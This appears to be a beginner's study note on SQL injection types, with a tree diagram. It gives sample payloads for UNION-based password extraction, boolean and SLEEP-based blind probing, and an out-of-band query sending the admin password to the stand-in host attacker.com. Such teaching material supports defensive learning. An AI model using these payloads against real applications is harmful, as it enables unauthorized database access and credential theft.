## 2 Main Types of SQL Injection Vulnerabilities


## 1 In-Band SQL Injection
  - You CAN see the results directly
  - The attacker gets results immediately on the same page/response.

  * Sub Types:
  1. Error-Based
  - Database errors are shown on the page.
  - Input: 'Error: "SQL syntax error near ''"
  - You see the error → use it to learn about the database!
  2. UNION-Based
  - Use UNION to combine your query with the original.
  - ' UNION SELECT username, password FROM users--
  - Results appear directly on the page:

   - Product 1
   - Product 2
   - admin - secretpass123 ← Your stolen data!
  

## 2 Blind SQL Injection

- You CANNOT see the results directly
- The application doesn't show database results or errors. You have to be clever!
## Three Subtypes:
## A) Boolean-Based
1. Page behaves differently based on TRUE/FALSE.
2. ' AND 1=1--  → Page loads normally ✓' AND 1=2--  → Page shows error or different content ✗
- Use TRUE/FALSE to extract data one bit at a time!

## B) Time-Based
1. Trigger delays to detect successful injection.
2. ' AND SLEEP(5)--
3. If page takes 5 seconds → Injection works! ✓
4. If instant response → Try something else

## C) Out-of-Band
1. Make the database contact YOUR server directly.
2. ' AND (SELECT password FROM users WHERE username='admin' INTO OUTFILE '\\attacker.com\data')--
```.


SQL Injection Vulnerabilities (Root)
├── In-Band SQL Injection (Parent)
│   ├── Error-Based (Child)
│   │   └── Attributes: Visible DB errors, Syntax exploitation
│   └── UNION-Based (Child)
│       └── Attributes: UNION SELECT, Direct data theft
└── Blind SQL Injection (Parent)
    ├── Boolean-Based (Child)
    │   └── Attributes: TRUE/FALSE responses, Bit-by-bit extraction
    ├── Time-Based (Child)
    │   └── Attributes: SLEEP() delays, Timing analysis
    └── Out-of-Band (Child)
        └── Attributes: DNS/HTTP exfiltration, External server contact  